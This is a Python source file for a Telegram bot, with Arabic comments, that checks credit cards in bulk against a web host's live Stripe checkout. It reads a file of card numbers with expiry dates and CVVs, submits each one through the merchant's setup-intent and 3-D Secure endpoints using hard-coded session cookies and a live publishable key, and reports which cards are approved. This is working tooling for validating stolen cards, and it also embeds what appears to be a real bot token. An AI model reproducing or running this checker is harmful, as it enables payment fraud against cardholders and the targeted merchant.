import os
import asyncio
import threading
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import requests
import random
import string
import time
import re

# ========== الإعدادات ==========
BOT_TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
ADMIN_IDS = [5895491379]  # ضع ID التليجرام بتاعك هنا

# الـ Cookies الأصلية
BASE_COOKIES = {
    '_gcl_au': '1.1.1731755719.1761294273',
    'PAPVisitorId': '7095f26325c875e9da4fdaa66171apP6',
    '_fbp': 'fb.1.1761298965302.822697239648290722',
    'lhc_per': 'vid|8994dfb5d60d3132fabe',
    '__mmapiwsid': '0199d361-1f43-7b6b-9c97-250e8a6a95db:0664b174ef7b3925be07d4b964be6a38b1029da7',
    '_gid': 'GA1.2.1609015390.1761435403',
    'blesta_sid': 'agjvbn46370v0ilm5h72b8h0c7',
    '_rdt_uuid': '1761294274156.8dd9903d-c9cf-401b-885d-0dad4931526f',
    '_uetsid': 'a2028140b1fa11f086cd03ee33166b9d',
    '_uetvid': 'df284260b0b211f086cb537b4a717cc2',
    '_ga': 'GA1.2.586933227.1761298965',
}

# ========== إحصائيات ==========
stats = {
    'total': 0,
    'checking': 0,
    'approved': 0,
    'rejected': 0,
    'secure_3d': 0,
    'auth_attempted': 0,
    'errors': 0,
    'start_time': None,
    'is_running': False,
    'dashboard_message_id': None,
    'chat_id': None,
    'current_cards': [],
    'error_details': {},
}

# ========== دالات مساعدة ==========
def generate_random_string(length):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_guid():
    return f"{generate_random_string(8)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(12)}"

def create_fresh_session():
    session = requests.Session()
    session.cookies.update(BASE_COOKIES)
    
    muid = f"{generate_guid()}{generate_random_string(6)}"
    sid = f"{generate_guid()}{generate_random_string(6)}"
    guid = f"{generate_guid()}{generate_random_string(6)}"
    stripe_js_id = generate_guid()
    
    session.cookies.set('__stripe_mid', muid)
    session.cookies.set('__stripe_sid', sid)
    
    return session, muid, sid, guid, stripe_js_id

def get_payment_page(session):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    }
    
    try:
        response = session.get('https://my.knownhost.com/client/accounts/add/cc/', headers=headers, timeout=30)
        
        csrf_token = None
        csrf_match = re.search(r'_csrf_token"\s+value="([^"]+)"', response.text)
        if csrf_match:
            csrf_token = csrf_match.group(1)
        
        setup_secret = None
        setup_match = re.search(r"'(seti_[A-Za-z0-9]+_secret_[A-Za-z0-9]+)'", response.text)
        if setup_match:
            setup_secret = setup_match.group(1)
        
        return csrf_token, setup_secret
    except:
        return None, None

# ========== فحص البطاقة ==========
async def check_card(card, bot_app):
    parts = card.strip().split('|')
    if len(parts) != 4:
        stats['errors'] += 1
        stats['error_details']['FORMAT_ERROR'] = stats['error_details'].get('FORMAT_ERROR', 0) + 1
        stats['checking'] -= 1
        await update_dashboard(bot_app)
        await send_result(bot_app, card, "ERROR", "صيغة خاطئة")
        return card, "ERROR", "صيغة خاطئة"
    
    card_number, exp_month, exp_year, cvv = parts
    
    session, muid, sid, guid, stripe_js_id = create_fresh_session()
    csrf_token, setup_secret = get_payment_page(session)
    
    if not setup_secret:
        stats['errors'] += 1
        stats['error_details']['SETUP_ERROR'] = stats['error_details'].get('SETUP_ERROR', 0) + 1
        stats['checking'] -= 1
        await update_dashboard(bot_app)
        await send_result(bot_app, card, "ERROR", "فشل Setup Secret")
        session.close()
        return card, "ERROR", "فشل Setup"
    
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    }
    
    data = {
        'stripe_js_id': stripe_js_id,
        'referrer_host': 'my.knownhost.com',
        'key': 'pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn',
        'request_surface': 'web_card_element_popup',
    }
    
    try:
        session.post('https://merchant-ui-api.stripe.com/elements/wallet-config', headers=headers, data=data, timeout=30)
    except:
        pass
    
    time_on_page = random.randint(300000, 600000)
    
    confirm_data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=+&payment_method_data[billing_details][address][city]=&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]=&payment_method_data[billing_details][address][state]=AL&payment_method_data[card][number]={card_number}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={exp_month}&payment_method_data[card][exp_year]={exp_year}&payment_method_data[guid]={guid}&payment_method_data[muid]={muid}&payment_method_data[sid]={sid}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F0366a8cf46%3B+stripe-js-v3%2F0366a8cf46%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fmy.knownhost.com&payment_method_data[time_on_page]={time_on_page}&payment_method_data[client_attribution_metadata][client_session_id]={stripe_js_id}&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn&client_attribution_metadata[client_session_id]={stripe_js_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_secret={setup_secret}'
    
    setup_intent_id = setup_secret.split('_secret_')[0]
    
    try:
        response = session.post(
            f'https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm',
            headers=headers,
            data=confirm_data,
            timeout=30
        )
        
        result = response.json()
        
        if 'next_action' in result:
            source = result['next_action']['use_stripe_sdk']['three_d_secure_2_source']
            
            auth_data = f'source={source}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F141.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn'
            
            auth_response = session.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=auth_data, timeout=30)
            auth_result = auth_response.json()
            
            trans_status = auth_result.get('ares', {}).get('transStatus', 'Unknown')
            
            if trans_status == 'N':
                stats['approved'] += 1
                stats['checking'] -= 1
                await update_dashboard(bot_app)
                await send_result(bot_app, card, "APPROVED", "Approved ✅")
                session.close()
                return card, "APPROVED", "Approved"
            elif trans_status == 'R':
                stats['rejected'] += 1
                stats['checking'] -= 1
                await update_dashboard(bot_app)
                await send_result(bot_app, card, "REJECTED", "Card Declined")
                session.close()
                return card, "REJECTED", "Declined"
            elif trans_status == 'C':
                stats['secure_3d'] += 1
                stats['checking'] -= 1
                await update_dashboard(bot_app)
                await send_result(bot_app, card, "3D_SECURE", "3D Secure Challenge")
                session.close()
                return card, "3D_SECURE", "3DS"
            elif trans_status == 'A':
                stats['auth_attempted'] += 1
                stats['checking'] -= 1
                await update_dashboard(bot_app)
                await send_result(bot_app, card, "AUTH_ATTEMPTED", "Authentication Attempted")
                session.close()
                return card, "AUTH_ATTEMPTED", "Auth Attempted"
            else:
                stats['errors'] += 1
                stats['error_details']['UNKNOWN_STATUS'] = stats['error_details'].get('UNKNOWN_STATUS', 0) + 1
                stats['checking'] -= 1
                await update_dashboard(bot_app)
                await send_result(bot_app, card, "UNKNOWN", f"Status: {trans_status}")
                session.close()
                return card, "UNKNOWN", trans_status
        else:
            stats['errors'] += 1
            stats['error_details']['NO_3DS'] = stats['error_details'].get('NO_3DS', 0) + 1
            stats['checking'] -= 1
            await update_dashboard(bot_app)
            await send_result(bot_app, card, "ERROR", "No 3DS Action")
            session.close()
            return card, "ERROR", "No 3DS"
            
    except Exception as e:
        stats['errors'] += 1
        stats['error_details']['EXCEPTION'] = stats['error_details'].get('EXCEPTION', 0) + 1
        stats['checking'] -= 1
        await update_dashboard(bot_app)
        await send_result(bot_app, card, "EXCEPTION", str(e)[:30])
        session.close()
        return card, "EXCEPTION", str(e)

# ========== دالات البوت ==========
async def send_result(bot_app, card, status_type, message):
    """إرسال نتيجة الفحص كزر"""
    if not stats['chat_id']:
        return
    
    emoji_map = {
        'APPROVED': '✅',
        'REJECTED': '❌',
        '3D_SECURE': '⚠️',
        'AUTH_ATTEMPTED': '🔄',
        'ERROR': '⚠️',
        'EXCEPTION': '💥',
        'UNKNOWN': '❓'
    }
    
    emoji = emoji_map.get(status_type, '❓')
    
    parts = card.split('|')
    cc = parts[0] if len(parts) > 0 else "****"
    masked = f"{cc[:6]}******{cc[-4:]}"
    
    keyboard = [
        [InlineKeyboardButton(f"💳 {masked}", callback_data="card_info")],
        [InlineKeyboardButton(f"{emoji} {message[:35]}", callback_data="response_info")],
        [InlineKeyboardButton(f"⏰ {datetime.now().strftime('%H:%M:%S')}", callback_data="time_info")]
    ]
    
    if status_type == 'APPROVED':
        try:
            await bot_app.bot.send_message(
                chat_id=stats['chat_id'],
                text=f"🎉 **APPROVED CARD FOUND!**",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
        except:
            pass

def create_dashboard_keyboard():
    """إنشاء أزرار Dashboard"""
    elapsed = 0
    if stats['start_time']:
        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
    mins, secs = divmod(elapsed, 60)
    hours, mins = divmod(mins, 60)
    
    keyboard = [
        [InlineKeyboardButton(f"🔥 الإجمالي: {stats['total']}", callback_data="total")],
        [
            InlineKeyboardButton(f"🔄 يتم الفحص: {stats['checking']}", callback_data="checking"),
            InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")
        ],
        [
            InlineKeyboardButton(f"✅ Approved: {stats['approved']}", callback_data="approved"),
            InlineKeyboardButton(f"❌ Rejected: {stats['rejected']}", callback_data="rejected")
        ],
        [
            InlineKeyboardButton(f"⚠️ 3D Secure: {stats['secure_3d']}", callback_data="3ds"),
            InlineKeyboardButton(f"🔄 Auth Attempted: {stats['auth_attempted']}", callback_data="auth")
        ],
        [
            InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")
        ]
    ]
    
    if stats['is_running']:
        keyboard.append([InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")])
    
    if stats['current_cards']:
        keyboard.append([InlineKeyboardButton("━━━ البطاقات الحالية ━━━", callback_data="separator")])
        for i, card_info in enumerate(stats['current_cards'][:3]):
            keyboard.append([InlineKeyboardButton(f"🔄 {card_info}", callback_data=f"card_{i}")])
    
    if stats['error_details']:
        keyboard.append([InlineKeyboardButton("━━━ أكثر الأخطاء ━━━", callback_data="error_sep")])
        sorted_errors = sorted(stats['error_details'].items(), key=lambda x: x[1], reverse=True)[:3]
        for error_type, count in sorted_errors:
            keyboard.append([InlineKeyboardButton(f"⚠️ {error_type}: {count}", callback_data=f"err_{error_type}")])
    
    return InlineKeyboardMarkup(keyboard)

async def update_dashboard(bot_app):
    """تحديث Dashboard"""
    if stats['dashboard_message_id'] and stats['chat_id']:
        try:
            await bot_app.bot.edit_message_text(
                chat_id=stats['chat_id'],
                message_id=stats['dashboard_message_id'],
                text="📊 **KNOWNHOST CARD CHECKER** 📊",
                reply_markup=create_dashboard_keyboard(),
                parse_mode='Markdown'
            )
        except:
            pass

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح")
        return
    
    keyboard = [[InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")]]
    await update.message.reply_text(
        "📊 **KNOWNHOST CARD CHECKER BOT**\n\n"
        "أرسل ملف .txt يحتوي على البطاقات\n"
        "الصيغة: `رقم|شهر|سنة|cvv`",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    
    if stats['is_running']:
        await update.message.reply_text("⚠️ يوجد فحص جاري!")
        return
    
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
    
    stats['total'] = len(cards)
    stats['checking'] = 0
    stats['approved'] = 0
    stats['rejected'] = 0
    stats['secure_3d'] = 0
    stats['auth_attempted'] = 0
    stats['errors'] = 0
    stats['current_cards'] = []
    stats['error_details'] = {}
    stats['start_time'] = datetime.now()
    stats['is_running'] = True
    stats['chat_id'] = update.effective_chat.id
    
    dashboard_msg = await update.message.reply_text(
        "📊 **KNOWNHOST CARD CHECKER** 📊",
        reply_markup=create_dashboard_keyboard(),
        parse_mode='Markdown'
    )
    stats['dashboard_message_id'] = dashboard_msg.message_id
    
    def run_checker():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(process_cards(cards, context.application))
        loop.close()
    
    threading.Thread(target=run_checker, daemon=True).start()

async def process_cards(cards, bot_app):
    for i in range(0, len(cards), 3):
        if not stats['is_running']:
            break
        
        batch = cards[i:i+3]
        stats['checking'] = len(batch)
        stats['current_cards'] = [f"{c.split('|')[0][:6]}****{c.split('|')[0][-4:]}" for c in batch if '|' in c]
        await update_dashboard(bot_app)
        
        tasks = [check_card(card, bot_app) for card in batch]
        await asyncio.gather(*tasks)
        
        if i + 3 < len(cards):
            await asyncio.sleep(2)
    
    stats['is_running'] = False
    stats['checking'] = 0
    stats['current_cards'] = []
    await update_dashboard(bot_app)
    
    if stats['chat_id']:
        keyboard = [
            [InlineKeyboardButton(f"✅ Approved: {stats['approved']}", callback_data="final_approved")],
            [InlineKeyboardButton(f"❌ Rejected: {stats['rejected']}", callback_data="final_rejected")],
            [InlineKeyboardButton(f"⚠️ 3D Secure: {stats['secure_3d']}", callback_data="final_3ds")],
            [InlineKeyboardButton(f"🔄 Auth Attempted: {stats['auth_attempted']}", callback_data="final_auth")],
            [InlineKeyboardButton(f"🔥 Total: {stats['total']}", callback_data="final_total")]
        ]
        await bot_app.bot.send_message(
            chat_id=stats['chat_id'],
            text="✅ **اكتمل الفحص!**",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "stop_check":
        stats['is_running'] = False
        await update_dashboard(context.application)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("🤖 البوت يعمل...")
    app.run_polling()

if __name__ == "__main__":
    main()
